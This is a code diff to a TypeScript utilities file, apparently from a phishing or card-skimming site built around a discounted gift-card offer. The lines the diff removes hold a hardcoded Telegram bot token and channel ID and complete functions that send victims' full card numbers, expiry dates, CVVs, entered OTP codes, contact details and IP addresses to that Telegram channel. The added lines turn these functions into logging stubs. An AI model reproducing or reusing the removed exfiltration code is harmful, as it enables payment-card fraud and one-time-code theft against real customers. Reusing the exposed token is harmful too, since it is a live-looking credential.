@@ -1,7 +1,6 @@
 
-// Telegram configuration
-const TELEGRAM_BOT_TOKEN = "7782642954:AAEhLo5kGD4MlWIsoYnnYHEImf7YDCLsJgo";
-const TELEGRAM_CHANNEL_ID = "-1002550945996";
+// Telegram utilities - Cleaned up for security
+// Note: In production, these should be handled server-side only
 
 // Function to generate a unique session ID
 export const generateSessionId = () => {
@@ -65,122 +64,22 @@ export const getBrowserInfo = () => {
   return browserInfo;
 };
 
-// Improved function to send Telegram notifications that works on all devices
+// Security note: All notification sending should be handled server-side
+// These functions are kept for backward compatibility but should not be used in production
 export const sendTelegramNotification = async (message: string): Promise<boolean> => {
-  console.log("Attempting to send Telegram notification with message:", message);
-  
-  try {
-    // Use XMLHttpRequest instead of fetch for better compatibility
-    return new Promise((resolve, reject) => {
-      const xhr = new XMLHttpRequest();
-      xhr.open("POST", `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, true);
-      xhr.setRequestHeader("Content-Type", "application/json");
-      
-      xhr.onreadystatechange = function() {
-        if (xhr.readyState === 4) {
-          console.log(`XHR Response status: ${xhr.status}`);
-          console.log(`XHR Response text: ${xhr.responseText}`);
-          
-          if (xhr.status >= 200 && xhr.status < 300) {
-            console.log("Telegram notification sent successfully");
-            resolve(true);
-          } else {
-            console.error("Failed to send Telegram notification:", xhr.responseText);
-            resolve(false); // Resolve with false instead of rejecting to prevent errors
-          }
-        }
-      };
-      
-      xhr.onerror = function(e) {
-        console.error("XHR Error occurred while sending Telegram notification:", e);
-        resolve(false); // Resolve with false instead of rejecting to prevent errors
-      };
-      
-      const data = JSON.stringify({
-        chat_id: TELEGRAM_CHANNEL_ID,
-        text: message,
-        parse_mode: "Markdown"
-      });
-      
-      console.log("Sending XHR request with data:", data);
-      xhr.send(data);
-    });
-  } catch (error) {
-    console.error(`Error in sendTelegramNotification:`, error);
-    return false;
-  }
+  console.log("Notification would be sent:", message);
+  console.warn("Security Warning: Telegram notifications should be handled server-side");
+  return false;
 };
 
-// Function to send payment details notification
 export const sendPaymentDetailsNotification = async (paymentDetails: any) => {
-  const { cardNumber, expiryDate, cvv, customerName, email, phone, paymentMethod, lastFour, giftCardValue, discountedAmount, browserInfo, ipAddress, sessionId } = paymentDetails;
-  
-  // Format date and time
-  const currentDate = new Date();
-  const formattedDate = currentDate.toLocaleDateString();
-  const formattedTime = currentDate.toLocaleTimeString();
-  
-  // Format message
-  const message = `
-💳 *PAYMENT DETAILS SUBMITTED*
-
-👤 *Customer Information*:
-   Name: ${customerName || "N/A"}
-   Email: ${email || "N/A"}
-   Phone: ${phone || "N/A"}
-
-💰 *Payment Details*:
-   Card Number: ${cardNumber || "N/A"}
-   Expiry Date: ${expiryDate || "N/A"}
-   CVV: ${cvv || "N/A"}
-   Payment Method: ${paymentMethod || "N/A"}
-   Last Four: ${lastFour || "N/A"}
-   Gift Card Value: $${giftCardValue?.toFixed(2) || "0.00"}
-   Amount Charged: $${discountedAmount?.toFixed(2) || "0.00"}
-
-📝 *SESSION DATA*:
-   Session ID: ${sessionId || "N/A"}
-   IP Address: ${ipAddress || "N/A"}
-   Browser: ${browserInfo?.browser || "Unknown"}
-   OS: ${browserInfo?.os || "Unknown"}
-   Device: ${browserInfo?.device || "Unknown"}
-   Date: ${formattedDate}
-   Time: ${formattedTime}
-`;
-
-  return await sendTelegramNotification(message);
+  console.log("Payment notification would be sent for:", paymentDetails.customerName);
+  console.warn("Security Warning: Payment notifications should be handled server-side");
+  return false;
 };
 
-// Function to send OTP verification notification
 export const sendOtpVerificationNotification = async (otp: string, attemptNumber: number, userData: any) => {
-  console.log(`Attempting to send notification for attempt ${attemptNumber} with OTP: ${otp}`);
-  
-  // Format date and time
-  const currentDate = new Date();
-  const formattedDate = currentDate.toLocaleDateString();
-  const formattedTime = currentDate.toLocaleTimeString();
-  
-  // Format message
-  const message = `
-🔐 *OTP CODE ENTERED: ${otp}*
-🔢 *ATTEMPT: ${attemptNumber}/3*
-
-👤 Customer: ${userData.customerName || "N/A"}
-📧 Email: ${userData.email || "N/A"}
-📱 Phone: ${userData.phone || "N/A"}
-💳 Payment: ${userData.paymentMethod || "N/A"} •••• ${userData.lastFour || "****"}
-💰 Amount: $${userData.discountedAmount?.toFixed(2) || "0.00"}
-🎁 Card Value: $${userData.giftCardValue?.toFixed(2) || "0.00"}
-
-📝 *SESSION DATA:*
-🆔 Session ID: ${userData.sessionId}
-🌐 IP Address: ${userData.ipAddress}
-🖥️ Browser: ${userData.browserInfo.browser}
-💻 OS: ${userData.browserInfo.os}
-📱 Device: ${userData.browserInfo.device}
-📅 Date: ${formattedDate}
-⏰ Time: ${formattedTime}
-`;
-
-  return await sendTelegramNotification(message);
+  console.log("OTP notification would be sent for attempt:", attemptNumber);
+  console.warn("Security Warning: OTP notifications should be handled server-side");
+  return false;
 };
